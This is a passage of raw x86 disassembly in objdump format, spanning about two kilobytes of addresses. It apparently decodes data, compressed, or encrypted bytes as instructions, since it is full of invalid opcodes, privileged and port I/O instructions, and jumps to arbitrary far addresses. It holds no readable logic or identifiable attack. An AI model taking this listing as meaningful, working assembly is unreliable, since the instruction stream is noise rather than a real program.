  41377d:	add    DWORD PTR [edi+ebp*1+0xf191e36],edi
  413784:	repz mov ch,0x25
  413787:	stos   DWORD PTR es:[edi],eax
  413788:	add    al,0x8b
  41378a:	add    ah,al
  41378c:	mov    ch,0xf
  41378e:	mov    bh,0xf1
  413790:	push   0xffffff82
  413792:	test   eax,0xaf2bfced
  413797:	or     bh,BYTE PTR [ebp+0x3be0e50a]
  41379d:	lods   al,BYTE PTR ds:[esi]
  41379e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41379f:	mov    esi,0x3f114a7c
  4137a4:	scas   eax,DWORD PTR es:[edi]
  4137a5:	out    dx,eax
  4137a6:	cmp    al,0x47
  4137a8:	enter  0xa18b,0x9f
  4137ac:	sahf   
  4137ad:	adc    eax,DWORD PTR [ecx+0x66]
  4137b0:	push   es
  4137b1:	mov    al,0xb0
  4137b3:	(bad)  
  4137b4:	mov    ds:0xb4c7dc48,al
  4137b9:	pop    eax
  4137ba:	test   DWORD PTR [edx+0x491cbb4c],0xe95a0b74
  4137c4:	jmp    0x1738:0xf78d05ec
  4137cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137cc:	retf   0x502f
  4137cf:	pushf  
  4137d0:	test   eax,0x178109a7
  4137d5:	pop    ecx
  4137d6:	hlt    
  4137d7:	daa    
  4137d8:	cmp    bh,BYTE PTR [edx+0x669da217]
  4137de:	sub    BYTE PTR [edi+ebx*4-0x52],bh
  4137e2:	dec    esi
  4137e3:	fisttp WORD PTR [ebx]
  4137e5:	sbb    ebp,DWORD PTR [esi]
  4137e7:	cld    
  4137e8:	adc    DWORD PTR [esi],0xffffff8d
  4137eb:	sub    eax,0x1e3a7d44
  4137f0:	mov    al,0x1b
  4137f2:	pop    ebp
  4137f3:	js     0x4137ae
  4137f5:	jno    0x41379d
  4137f7:	adc    BYTE PTR [edi-0x68],cl
  4137fa:	jmp    0xdf23c610
  4137ff:	pop    eax
  413800:	fbld   TBYTE PTR [eax]
  413802:	or     DWORD PTR [ecx-0x52],edi
  413805:	sbb    edx,eax
  413807:	push   cs
  413808:	push   edx
  413809:	add    DWORD PTR [edi-0x7c],ebx
  41380c:	sbb    ch,BYTE PTR [esi+0x2e4b9c32]
  413812:	jle    0x4137c3
  413814:	jne    0x41388d
  413816:	pop    edx
  413817:	fnstcw WORD PTR [edi-0x320a786d]
  41381d:	imul   edi,DWORD PTR [ebx+0x49],0x5e
  413821:	jp     0x41380b
  413823:	mov    esi,0x69607e04
  413828:	mov    bl,0xb5
  41382a:	jl     0x4137be
  41382c:	call   FWORD PTR [ecx-0x19219fb0]
  413832:	shl    DWORD PTR [eax-0x70],1
  413835:	sti    
  413836:	not    BYTE PTR [edi+0x3c5ac18b]
  41383c:	cli    
  41383d:	scas   al,BYTE PTR es:[edi]
  41383e:	dec    eax
  41383f:	lods   eax,DWORD PTR ds:[esi]
  413840:	mov    cl,0x8
  413842:	fs imul esi,ecx,0x3d
  413846:	cmp    ebx,esi
  413848:	(bad)  
  413849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41384a:	pop    es
  41384b:	jmp    0x41380d
  41384d:	mov    ch,0xd1
  41384f:	ror    DWORD PTR [eax+0x59],cl
  413852:	lods   al,BYTE PTR ds:[esi]
  413853:	and    eax,0xbec0db5
  413858:	mov    ds:0x12a50033,ax
  41385e:	mov    eax,DWORD PTR [ecx+ebx*4]
  413861:	out    dx,eax
  413862:	mov    ebx,0x21fefa5c
  413867:	dec    ebp
  413868:	test   BYTE PTR [ebx+0x52],cl
  41386b:	mov    eax,0x9fc752fd
  413870:	ret    0xc6d9
  413873:	mov    ecx,0x842698ba
  413878:	mov    dh,0x9b
  41387a:	jg     0x4138cd
  41387c:	sbb    dl,BYTE PTR [edx+0x4f]
  41387f:	inc    ebx
  413880:	sub    al,bh
  413882:	pop    ds
  413883:	cmc    
  413884:	pop    esi
  413885:	loope  0x4138d2
  413887:	loopne 0x4138a7
  413889:	aaa    
  41388a:	mov    esp,0x9ed1246a
  41388f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413890:	push   edi
  413891:	jo     0x4138f8
  413893:	inc    edi
  413894:	adc    BYTE PTR [edx],0x38
  413897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413898:	fxch   st(6)
  41389a:	addr16 jns 0x4138f8
  41389d:	sub    cl,BYTE PTR [ecx-0x4f]
  4138a0:	test   al,0xcb
  4138a2:	aad    0xd6
  4138a4:	sbb    ch,BYTE PTR [esi]
  4138a6:	int3   
  4138a7:	repnz mov esi,0x3ddcfe2c
  4138ad:	dec    ebp
  4138ae:	hlt    
  4138af:	jbe    0x413866
  4138b1:	cld    
  4138b2:	fcmovbe st,st(6)
  4138b4:	pop    esp
  4138b5:	pop    eax
  4138b6:	or     ecx,DWORD PTR [edi+eax*2+0x5e]
  4138ba:	dec    edx
  4138bb:	or     bh,BYTE PTR [esi]
  4138bd:	sub    DWORD PTR [eax+0x58],esi
  4138c0:	es inc ebx
  4138c2:	mov    ebx,0x18aa7ba2
  4138c7:	sbb    edx,edx
  4138c9:	push   ds
  4138ca:	stc    
  4138cb:	rol    DWORD PTR [esi-0x34752c47],1
  4138d1:	mov    ah,0x8
  4138d3:	mov    ebp,DWORD PTR [edi+0x5d]
  4138d6:	sub    edi,DWORD PTR [ebp-0x78]
  4138d9:	cwde   
  4138da:	stos   DWORD PTR es:[edi],eax
  4138db:	enter  0x63be,0xd2
  4138df:	inc    ebp
  4138e0:	lods   al,BYTE PTR ds:[esi]
  4138e1:	neg    BYTE PTR [ecx+0x77]
  4138e4:	shl    BYTE PTR [ebp+0x12],cl
  4138e7:	mov    BYTE PTR ds:0x40f72617,0xe4
  4138ee:	sbb    DWORD PTR [ebx+0x23],edi
  4138f1:	dec    edx
  4138f2:	je     0x41391a
  4138f4:	adc    DWORD PTR [ebp+0x27c745c2],0xffffffc4
  4138fb:	jecxz  0x4138e4
  4138fd:	test   DWORD PTR [esi+0x18a2b2dc],ecx
  413903:	iret   
  413904:	cli    
  413905:	mov    eax,ds:0x5a284d47
  41390a:	cld    
  41390b:	mov    DWORD PTR [eax],esp
  41390d:	sub    al,0xc3
  41390f:	lahf   
  413910:	aad    0x1f
  413912:	dec    eax
  413913:	aaa    
  413914:	dec    esp
  413915:	pop    ebx
  413916:	push   ebp
  413917:	nop
  413918:	pop    edx
  413919:	fisttp WORD PTR [edi+edi*2-0x1c]
  41391d:	xchg   esi,eax
  41391e:	ds in  eax,dx
  413920:	pop    esi
  413921:	dec    edx
  413922:	std    
  413923:	lods   al,BYTE PTR ds:[esi]
  413924:	xchg   ecx,eax
  413925:	xchg   DWORD PTR [eax-0x31],ecx
  413928:	fstp   TBYTE PTR [ebx-0x43]
  41392b:	add    eax,0x977f9648
  413930:	pop    esp
  413931:	jmp    0x8a98c694
  413936:	aaa    
  413937:	into   
  413938:	inc    edi
  413939:	ror    DWORD PTR [esi+0x8],0xb8
  41393d:	push   edx
  41393e:	stos   BYTE PTR es:[edi],al
  41393f:	dec    edi
  413940:	rol    BYTE PTR [edi+eiz*4-0x49],0xb1
  413945:	addr16 jae 0x41396a
  413948:	ret    
  413949:	rcr    DWORD PTR [ecx+0x5733a226],cl
  41394f:	mov    cl,0x7f
  413951:	inc    ebp
  413952:	jne    0x413939
  413954:	ins    BYTE PTR es:[edi],dx
  413955:	(bad)  
  413957:	pusha  
  413958:	mov    ?,WORD PTR [eax-0x20fcfa00]
  41395e:	inc    ebp
  41395f:	test   al,0x4
  413961:	dec    ecx
  413962:	and    al,ah
  413964:	fstp   QWORD PTR [edi+ebp*2]
  413967:	xchg   esi,eax
  413968:	mov    edi,0x861621e7
  41396d:	ror    DWORD PTR es:[edi-0x657fd732],cl
  413974:	pop    ds
  413975:	daa    
  413976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413977:	jle    0x41398f
  413979:	jnp    0x413916
  41397b:	pop    ss
  41397c:	pop    ss
  41397d:	xor    edi,DWORD PTR [esp+esi*2-0x1b]
  413981:	test   BYTE PTR [esi+0x330ad],bl
  413987:	jns    0x413936
  413989:	xor    BYTE PTR [eax-0x22f65b32],cl
  41398f:	mov    esi,0xff68b7c2
  413994:	push   ss
  413995:	pushf  
  413996:	or     DWORD PTR [eax+0x40757468],esi
  41399c:	xchg   edi,eax
  41399d:	call   0xb0f38aec
  4139a2:	mov    cl,cl
  4139a4:	pop    eax
  4139a5:	mov    gs,WORD PTR [esi]
  4139a7:	mov    esp,DWORD PTR [ecx+esi*8]
  4139aa:	mov    ds:0x7fb22f8d,eax
  4139af:	and    eax,0x1f293750
  4139b4:	lock inc ecx
  4139b6:	(bad)  
  4139b8:	sbb    eax,0x7ccc8d91
  4139bd:	add    bl,dh
  4139bf:	xlat   BYTE PTR ds:[ebx]
  4139c0:	xor    BYTE PTR [edi+edx*1-0x79],dl
  4139c4:	inc    ebx
  4139c5:	loope  0x413a0d
  4139c7:	clc    
  4139c8:	test   ecx,eax
  4139ca:	xchg   ebp,eax
  4139cb:	lods   al,BYTE PTR ds:[esi]
  4139cc:	sar    DWORD PTR [esi+edi*8],1
  4139cf:	inc    ebx
  4139d0:	sub    dh,BYTE PTR [edx]
  4139d2:	adc    DWORD PTR [edx],edi
  4139d4:	xlat   BYTE PTR ds:[ebx]
  4139d5:	sub    edx,DWORD PTR [eax+esi*8+0x5b]
  4139d9:	cmp    bl,BYTE PTR [edx]
  4139db:	arpl   dx,bx
  4139dd:	pop    ds
  4139de:	mov    edi,0x97fdfb5
  4139e3:	pop    es
  4139e4:	aad    0x43
  4139e6:	inc    ebx
  4139e7:	imul   ebp,DWORD PTR [esi-0x7ae134e7],0x9418e2bd
  4139f1:	(bad)  
  4139f2:	push   ebx
  4139f3:	or     edx,esi
  4139f5:	and    al,0xaf
  4139f7:	test   DWORD PTR [edx],ecx
  4139f9:	jge    0x413a5f
  4139fb:	scas   eax,DWORD PTR es:[edi]
  4139fc:	popf   
  4139fd:	bound  ebx,QWORD PTR [esi]
  4139ff:	out    0xe8,eax
  413a01:	sub    DWORD PTR [edx-0x75],eax
  413a04:	jl     0x413a06
  413a06:	xchg   ecx,eax
  413a07:	push   0x2
  413a09:	inc    ebx
  413a0a:	dec    eax
  413a0b:	aaa    
  413a0c:	or     BYTE PTR [edi+esi*8-0x674c4838],0xb9
  413a14:	lahf   
  413a15:	pop    ebx
  413a16:	fsubr  st(1),st
  413a18:	inc    ecx
  413a19:	shl    DWORD PTR [ebx-0x128c6d05],1
  413a1f:	je     0x413a46
  413a21:	(bad)  
  413a22:	ret    
  413a23:	jg     0x4139ca
  413a25:	mov    esp,0xb36988bc
  413a2a:	lea    edx,[edi+0x5d]
  413a2d:	sbb    ecx,ebp
  413a2f:	inc    ebx
  413a30:	xlat   BYTE PTR ds:[ebx]
  413a31:	pop    eax
  413a32:	hlt    
  413a33:	cmp    DWORD PTR [esi-0x72],eax
  413a36:	mov    eax,0x275f0326
  413a3b:	std    
  413a3c:	pushf  
  413a3d:	adc    al,0xba
  413a3f:	and    BYTE PTR [eax],ch
  413a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a42:	div    ch
  413a44:	(bad)  
  413a45:	and    BYTE PTR [edx-0x77],bh
  413a48:	mov    eax,0x5e081e23
  413a4d:	sub    eax,0x5c6a4dae
  413a52:	popa   
  413a53:	ret    0x49b7
  413a56:	inc    ecx
  413a57:	retf   
  413a58:	out    0x8e,eax
  413a5a:	cmc    
  413a5b:	jl     0x413adc
  413a5d:	jp     0x413a79
  413a5f:	retf   
  413a60:	aad    0x2f
  413a62:	sahf   
  413a63:	mov    bl,0xe1
  413a65:	loopne 0x413a01
  413a67:	loop   0x413ac2
  413a69:	push   ebx
  413a6a:	call   0xfbc:0xee44700d
  413a71:	pop    eax
  413a72:	push   eax
  413a73:	mov    bl,0xf1
  413a75:	push   cs
  413a76:	xor    BYTE PTR [edi+0x2b],0x58
  413a7a:	mov    BYTE PTR [ebp+0x1998de2],0x5e
  413a81:	mov    WORD PTR [ebp-0x74],ss
  413a84:	and    al,0xba
  413a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a87:	add    edx,DWORD PTR [ebx+0x5e5d9382]
  413a8d:	mov    cl,0x56
  413a8f:	fild   DWORD PTR [ecx+0x71f6115f]
  413a95:	mov    ch,ah
  413a97:	bts    DWORD PTR [edi+eax*2-0x56],edx
  413a9c:	retf   
  413a9d:	(bad)  
  413a9e:	adc    BYTE PTR [eax-0x66],cl
  413aa1:	cdq    
  413aa2:	mov    edi,0x36d655ad
  413aa7:	aas    
  413aa8:	pop    ds
  413aa9:	or     eax,0xc84457f5
  413aae:	sbb    al,0xe
  413ab0:	outs   dx,BYTE PTR ds:[esi]
  413ab1:	(bad)  
  413ab2:	dec    esp
  413ab3:	and    BYTE PTR [ecx-0x7c77d1],bl
  413ab9:	cmc    
  413aba:	mov    al,0x28
  413abc:	test   al,0xbd
  413abe:	mov    edx,0xf867c345
  413ac3:	sbb    ebp,DWORD PTR cs:[ecx-0x4962d609]
  413aca:	jmp    0x413b3a
  413acc:	test   DWORD PTR [ebp+0x39a4583],ebx
  413ad2:	ds and dl,bl
  413ad5:	add    al,0x4b
  413ad7:	js     0x413b1f
  413ad9:	icebp  
  413ada:	pusha  
  413adb:	in     al,0x1a
  413add:	mov    dh,0x5b
  413adf:	and    eax,0x756bbd36
  413ae4:	jae    0x413ade
  413ae6:	sbb    DWORD PTR [esi+ebx*1+0x337ee945],esi
  413aed:	mov    eax,ds:0x43aa10cb
  413af2:	push   ebx
  413af3:	and    al,0x5
  413af5:	pop    esi
  413af6:	pop    ss
  413af7:	stos   DWORD PTR es:[edi],eax
  413af8:	lods   eax,DWORD PTR ds:[esi]
  413af9:	jl     0x413ad6
  413afb:	push   0x66
  413afd:	mov    eax,ds:0x8e26660
  413b02:	idiv   BYTE PTR [eax-0x607007d0]
  413b08:	fistp  DWORD PTR [eax]
  413b0a:	mov    eax,ds:0x7d119cbf
  413b0f:	cmp    ch,0xff
  413b12:	and    DWORD PTR [edi+0x54],esp
  413b15:	cwde   
  413b16:	xchg   BYTE PTR [ebp+eiz*8-0x75],bh
  413b1a:	mov    dl,bl
  413b1c:	div    ecx
  413b1e:	cmp    DWORD PTR [esp+edi*2],eax
  413b21:	sbb    esi,DWORD PTR ds:0x65049e0b
  413b27:	das    
  413b28:	and    ah,BYTE PTR [ebp-0x33fe7879]
  413b2e:	mov    gs,WORD PTR [eax+eiz*4-0x42]
  413b32:	sar    BYTE PTR [ecx+0x28d6e837],1
  413b38:	and    DWORD PTR [edx],esi
  413b3a:	das    
  413b3b:	sub    cl,BYTE PTR [edi+ebx*8-0x33ecf2db]
  413b42:	fnstsw WORD PTR ds:0x7c347038
  413b48:	icebp  
  413b49:	(bad)  
  413b4a:	rcr    BYTE PTR [ebx-0x223fdafe],1
  413b50:	retf   0x9078
  413b53:	sbb    al,0xb6
  413b55:	mov    ebx,eax
  413b57:	hlt    
  413b58:	dec    ebx
  413b59:	imul   esp,ebp,0x57
  413b5c:	inc    ebx
  413b5d:	(bad)  
  413b5e:	mov    eax,0xf06c0f3c
  413b63:	mov    esp,0x179f1b9
  413b68:	pop    eax
  413b69:	or     BYTE PTR [ebx],al
  413b6b:	fild   QWORD PTR [eax+0x22afe060]
  413b71:	adc    edx,DWORD PTR [ecx]
  413b73:	add    edx,DWORD PTR [ebp*4+0x1390a37c]
  413b7a:	push   cs
  413b7b:	test   DWORD PTR [eax+eiz*1-0x10e60347],ecx
  413b82:	pop    ds
  413b83:	lahf   
  413b84:	mov    edi,0xa4fd6ec5
  413b89:	jbe    0x413bb9
  413b8b:	pop    esp
  413b8c:	das    
  413b8d:	mov    dh,0x1e
  413b8f:	dec    eax
  413b90:	or     esp,DWORD PTR [eax-0x67]
  413b93:	push   ds
  413b94:	arpl   WORD PTR [ecx-0x4a],sp
  413b97:	sar    ch,1
  413b99:	adc    ecx,esp
  413b9b:	jmp    0x2dfe8c97
  413ba0:	push   ecx
  413ba1:	pusha  
  413ba2:	mov    gs,esi
  413ba4:	call   0x748f:0xe2d358ed
  413bab:	dec    edi
  413bac:	pop    edx
  413bad:	addr16 hlt 
  413baf:	das    
  413bb0:	mov    ah,0xb4
  413bb2:	dec    esi
  413bb3:	xchg   DWORD PTR [ecx],edx
  413bb5:	js     0x413bdf
  413bb7:	jg     0x413c13
  413bb9:	sub    al,bh
  413bbb:	or     BYTE PTR [ebx-0x733c5451],0x54
  413bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bc3:	mov    DWORD PTR [edx-0x9],0x33dcae5c
  413bca:	fs pushf 
  413bcc:	add    al,ah
  413bce:	pop    esi
  413bcf:	ins    DWORD PTR es:[edi],dx
  413bd0:	(bad)  
  413bd1:	shl    BYTE PTR [edx],1
  413bd3:	or     edx,DWORD PTR [ecx]
  413bd5:	stos   BYTE PTR es:[edi],al
  413bd6:	xchg   edi,eax
  413bd7:	cmp    eax,0x7bcbbd4
  413bdc:	shl    BYTE PTR [ecx],1
  413bde:	es pop di
  413be1:	(bad)  
  413be2:	ja     0x413bdc
  413be4:	sar    bh,1
  413be6:	mov    BYTE PTR [ebx-0x7c11d816],al
  413bec:	lods   al,BYTE PTR ds:[esi]
  413bed:	ja     0x413c0e
  413bef:	mov    ah,0xef
  413bf1:	sar    DWORD PTR [edi-0x57992880],0x85
  413bf8:	xor    eax,0xd341fe77
  413bfd:	adc    dh,cl
  413bff:	pop    ebp
  413c00:	mov    esi,0x8882b0af
  413c05:	mov    dh,BYTE PTR [ebp+0x3a773215]
  413c0b:	sbb    DWORD PTR [edi+edi*8+0x7f],ecx
  413c0f:	xor    DWORD PTR [ecx+eax*1+0x2a071646],ebx
  413c16:	push   ss
  413c17:	in     al,0x23
  413c19:	dec    edx
  413c1a:	lods   eax,DWORD PTR ds:[esi]
  413c1b:	cmp    BYTE PTR [ecx-0x2b],ah
  413c1e:	pushf  
  413c1f:	sbb    edi,esi
  413c21:	loopne 0x413beb
  413c23:	int    0x81
  413c25:	dec    edi
  413c26:	cmp    ebx,DWORD PTR [edi]
  413c28:	fmulp  st(3),st
  413c2a:	lahf   
  413c2b:	mov    ds:0xf14347cb,al
  413c30:	cmp    ah,BYTE PTR [esi+eax*8-0x20fcbec5]
  413c37:	adc    ecx,DWORD PTR [ecx+0x30d6ace1]
  413c3d:	sub    eax,0xf8b6521f
  413c42:	stos   DWORD PTR es:[edi],eax
  413c43:	aam    0x14
  413c45:	mov    dl,0xdc
  413c47:	ja     0x413c4d
  413c49:	jge    0x413c05
  413c4b:	xlat   BYTE PTR ds:[ebx]
  413c4c:	call   0x8a73:0xf9d8657c
  413c53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c54:	out    0x9f,al
  413c56:	sub    BYTE PTR [eax-0x2d51e907],0xfe
  413c5d:	clc    
  413c5e:	push   esi
  413c5f:	and    BYTE PTR ds:0x1cca39f2,ch
  413c65:	retf   
  413c66:	in     eax,dx
  413c67:	push   0x3e
  413c69:	cmp    al,0xb
  413c6b:	xor    eax,0xafa6416d
  413c70:	xchg   ebx,eax
  413c71:	out    0xa7,al
  413c73:	fist   WORD PTR [edi-0x2d4d61ab]
  413c79:	or     al,0x25
  413c7b:	add    ecx,DWORD PTR [edx+0x69]
  413c7e:	(bad)  
  413c7f:	retf   0xa609
  413c82:	push   cs
  413c83:	jg     0x413cd8
  413c85:	adc    dh,BYTE PTR [edx+0x70]
  413c88:	push   cs
  413c89:	std    
  413c8a:	daa    
  413c8b:	mov    cl,0x4d
  413c8d:	add    esp,DWORD PTR [esi-0x3035c164]
  413c93:	jnp    0x413ca9
  413c95:	mov    ds:0xb003c8f,al
  413c9a:	into   
  413c9b:	test   eax,0xbb33c71f
  413ca0:	in     eax,0x7b
  413ca2:	or     dl,ch
  413ca4:	das    
  413ca5:	pop    ss
  413ca6:	add    eax,0x1fb7a722
  413cab:	loopne 0x413cb8
  413cad:	pushf  
  413cae:	loopne 0x413d2e
  413cb0:	fisubr WORD PTR [ebp+eiz*2+0x4082407e]
  413cb7:	add    al,0xa3
  413cb9:	mov    esp,0xbec4ba3e
  413cbe:	out    dx,al
  413cbf:	lods   al,BYTE PTR ds:[esi]
  413cc0:	inc    ebx
  413cc1:	ja     0x413ca5
  413cc3:	icebp  
  413cc4:	push   es
  413cc5:	ja     0x413d2d
  413cc7:	push   esi
  413cc8:	push   ecx
  413cc9:	jmp    0x38892bb0
  413cce:	pop    esi
  413ccf:	push   edx
  413cd0:	inc    edx
  413cd1:	test   DWORD PTR [ecx-0x3c586834],edi
  413cd7:	in     eax,dx
  413cd8:	retf   
  413cd9:	sbb    eax,0x285d24fa
  413cde:	adc    eax,0xf2be6761
  413ce3:	idiv   DWORD PTR [eax]
  413ce5:	xor    BYTE PTR [ecx],bh
  413ce7:	adc    dl,bh
  413ce9:	mov    al,0x74
  413ceb:	inc    ebx
  413cec:	dec    ebx
  413ced:	sbb    edx,DWORD PTR [edx]
  413cef:	fnstcw WORD PTR [ebp-0x6b837527]
  413cf5:	xor    bh,BYTE PTR [ecx-0x5872cd6e]
  413cfb:	push   ecx
  413cfc:	pop    edx
  413cfd:	(bad)  
  413cfe:	sti    
  413cff:	and    DWORD PTR [eax+0x3a],ecx
  413d02:	test   DWORD PTR [eax],esi
  413d04:	ret    0xb7b8
  413d07:	push   esp
  413d08:	loope  0x413d2a
  413d0a:	aas    
  413d0b:	fdiv   st(3),st
  413d0d:	imul   esi,DWORD PTR [edi],0x46
  413d10:	pop    edi
  413d11:	mov    esi,ebx
  413d13:	lods   al,BYTE PTR ds:[esi]
  413d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d15:	push   ecx
  413d16:	and    eax,0x3ac000be
  413d1b:	mov    edi,DWORD PTR [edi-0x4c]
  413d1e:	cmp    al,0x5
  413d20:	and    edx,DWORD PTR ds:0xd63df41f
  413d26:	push   cs
  413d27:	adc    ah,al
  413d29:	sti    
  413d2a:	scas   al,BYTE PTR es:[edi]
  413d2b:	sti    
  413d2c:	xchg   edx,eax
  413d2d:	mov    esp,0x5bc3e4b2
  413d32:	popa   
  413d33:	or     edx,edi
  413d35:	lods   eax,DWORD PTR ds:[esi]
  413d36:	sub    DWORD PTR [eax+0x9e857cb],edi
  413d3c:	dec    ebx
  413d3d:	arpl   WORD PTR [edx+0x3a],cx
  413d40:	in     al,0x66
  413d42:	mov    WORD PTR [ecx+0x509122c8],?
  413d48:	cdq    
  413d49:	sub    edi,eax
  413d4b:	jnp    0x413d3c
  413d4d:	sar    DWORD PTR [ecx*8-0x45b294d7],cl
  413d54:	out    0xc9,al
  413d56:	es xchg dh,dl
  413d59:	out    0xe1,eax
  413d5b:	mov    bl,0xd9
  413d5d:	mov    bh,ah
  413d5f:	dec    eax
  413d60:	mov    ecx,0x64ea4705
  413d65:	fwait
  413d66:	push   ds
  413d67:	jge    0x413d8c
  413d69:	inc    edx
  413d6a:	mov    esi,0x40261fca
  413d6f:	shr    DWORD PTR [edi-0x50],cl
  413d72:	push   es
  413d73:	inc    ebx
  413d74:	push   cs
  413d75:	push   ss
  413d76:	jne    0x413d73
  413d78:	repz push esp
  413d7a:	mov    cs,WORD PTR [esi+0x46106060]
  413d80:	imul   ebp,DWORD PTR [ebp+0x5a],0x3cf33c41
  413d87:	stc    
  413d88:	bound  edi,QWORD PTR [ecx]
  413d8a:	(bad)  
  413d8b:	pop    edi
  413d8c:	shr    DWORD PTR [edi],1
  413d8e:	in     al,dx
  413d8f:	dec    esi
  413d90:	pop    eax
  413d91:	push   ebx
  413d92:	sub    DWORD PTR [ecx+0x35e8e007],ebx
  413d98:	stc    
  413d99:	pusha  
  413d9a:	mov    ebp,0x9bb5ef67
  413d9f:	aad    0xc7
  413da1:	jl     0x413dbc
  413da3:	loop   0x413d34
  413da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413da6:	sbb    eax,0xe0a194f1
  413dab:	test   eax,0xeaa67736
  413db0:	imul   ecx,DWORD PTR [eax-0x2cce508e],0x137be1f5
  413dba:	xor    cl,BYTE PTR ds:0xc2791cf1
  413dc0:	in     al,dx
  413dc1:	jg     0x413dba
  413dc3:	(bad)  
  413dc4:	out    dx,al
  413dc5:	xchg   edi,eax
  413dc6:	jns    0x413d6a
  413dc8:	clc    
  413dc9:	mov    dh,0xdf
  413dcb:	(bad)  
  413dcc:	and    al,BYTE PTR [edx-0x7e]
  413dcf:	dec    eax
  413dd0:	add    BYTE PTR [ebx-0x6ee193f8],bl
  413dd6:	rol    BYTE PTR [ecx],0xf6
  413dd9:	mul    DWORD PTR [edx-0x6fa8e9b9]
  413ddf:	xor    DWORD PTR [ebp+0x10],esp
  413de2:	push   dx
  413de4:	rcr    BYTE PTR [esi-0xc],1
  413de7:	pop    eax
  413de8:	or     al,0x76
  413dea:	into   
  413deb:	dec    esi
  413dec:	lahf   
  413ded:	xchg   esp,eax
  413dee:	into   
  413def:	pop    ebx
  413df0:	mov    edi,0x71ac8f0
  413df5:	jb     0x413e6f
  413df7:	pop    eax
  413df8:	aam    0xfc
  413dfa:	shl    BYTE PTR [ecx],cl
  413dfc:	adc    ecx,DWORD PTR [edi+0x76e056fc]
  413e02:	sti    
  413e03:	sbb    BYTE PTR [ebp-0x68],dh
  413e06:	daa    
  413e07:	popf   
  413e08:	lock mov eax,DWORD PTR [esp+ebp*1-0xfc51cfc]
  413e10:	and    eax,0x2ca12d81
  413e15:	sbb    ah,cl
  413e17:	or     al,BYTE PTR [eax+edi*1+0x24]
  413e1b:	jmp    0x715a0eba
  413e20:	cmp    al,0xc
  413e22:	and    eax,0x27434137
  413e27:	inc    esi
  413e28:	enter  0xab1f,0x76
  413e2c:	push   cs
  413e2d:	ds pop edx
  413e2f:	sbb    eax,0x642524a9
  413e34:	adc    DWORD PTR ds:0x903b1f61,ebx
  413e3a:	mov    eax,0x1daaa7db
  413e3f:	jmp    DWORD PTR [eax-0x47c964aa]
  413e45:	adc    esp,ebp
  413e47:	sbb    ch,BYTE PTR [edi]
  413e49:	cmc    
  413e4a:	jbe    0x413e26
  413e4c:	xor    BYTE PTR [edi],cl
  413e4e:	mov    ah,0xab
  413e50:	rcr    BYTE PTR [edx],1
  413e52:	dec    ecx
  413e53:	xchg   esi,eax
  413e54:	addr16 fcomip st,st(5)
  413e57:	lods   eax,DWORD PTR ds:[esi]
  413e58:	fnstcw WORD PTR [ecx+ebx*2-0x4]
  413e5c:	cmp    ah,BYTE PTR [ebp-0x21]
  413e5f:	mov    cl,0x84
  413e61:	sbb    DWORD PTR [edi],esp
  413e63:	pop    DWORD PTR [ebp+ebx*8+0xdb686c6]
  413e6a:	mov    ebx,0xcf238504
  413e6f:	pop    esp
  413e70:	out    0x7e,eax
  413e72:	pop    ebp
  413e73:	cmp    al,0xb6
  413e75:	lock mov edx,DWORD PTR [eax+ebx*8+0x44]
  413e7a:	dec    esi
  413e7b:	fbld   TBYTE PTR ds:0x503ef860
  413e81:	ret    0x7d9d
  413e84:	lea    ecx,[eax+0x643916b4]
  413e8a:	test   BYTE PTR [edi*2+0x67b448d7],cl
  413e91:	enter  0xe643,0x81
  413e95:	lds    edi,FWORD PTR ds:0x717e3f0c
  413e9b:	(bad)  
  413e9c:	jmp    0x1e02:0xcc5a27be
  413ea3:	(bad)  
  413ea4:	imul   bl
  413ea6:	xor    al,0xda
  413ea8:	rep outs dx,BYTE PTR ds:[esi]
  413eaa:	sbb    DWORD PTR [esi-0x174e1c82],esp
  413eb0:	ins    BYTE PTR es:[edi],dx
  413eb1:	pop    ecx
  413eb2:	inc    eax
  413eb3:	mov    ch,0x75
  413eb5:	mov    bl,0xbe
  413eb7:	(bad)  [edx]
  413eb9:	or     BYTE PTR [edx],0x9e
  413ebc:	out    0x6c,al
  413ebe:	dec    eax
  413ebf:	add    ebx,0xffffffac
  413ec2:	pusha  
  413ec3:	lock cld 
  413ec5:	adc    DWORD PTR [edi-0x51],0x8768485f
  413ecc:	mov    eax,ds:0xbd3f8f59
  413ed1:	inc    esi
  413ed2:	xor    eax,0x4f09450b
  413ed7:	(bad)  
  413ed8:	out    0x74,eax
  413eda:	nop
  413edb:	sbb    ebx,DWORD PTR [edx]
  413edd:	xchg   edx,eax
  413ede:	jp     0x413f39
  413ee0:	mov    dl,BYTE PTR [eax+eiz*1]
  413ee3:	xor    BYTE PTR [edi+0x5e],dh
  413ee6:	das    
  413ee7:	add    al,0xb7
  413ee9:	dec    ebx
  413eea:	jecxz  0x413f5a
  413eec:	push   ecx
  413eed:	outs   dx,BYTE PTR ds:[esi]
  413eee:	call   0x653c:0x99d91190
  413ef5:	sub    bl,ah
  413ef7:	push   dx
  413ef9:	inc    ecx
  413efa:	shl    BYTE PTR [esp+ebx*4],0x6a
  413efe:	or     al,0x1
  413f00:	xchg   edi,eax
  413f01:	sbb    eax,0xe5ced3ce
  413f06:	cld    
  413f07:	xor    esp,DWORD PTR [ecx]
  413f09:	pop    ebx
  413f0a:	jg     0x413f6b
  413f0c:	lea    ebx,cs:[ebx-0x6b739ac4]
  413f13:	inc    ecx
  413f14:	pop    edx
  413f15:	stos   BYTE PTR es:[edi],al
  413f16:	mov    ds:0x4e6c66cd,eax
  413f1b:	fcmove st,st(6)
  413f1d:	inc    ecx
  413f1e:	cmp    al,0x27
  413f20:	out    0xbc,al
  413f22:	mov    ebx,0xd83758ea
  413f27:	jg     0x413eee
  413f29:	in     al,0xa6
  413f2b:	lds    eax,FWORD PTR [edi]
  413f2d:	dec    esp
  413f2e:	fdivr  QWORD PTR [edx]
  413f30:	sub    eax,0x67d08148
  413f35:	push   0x1fdfabb7
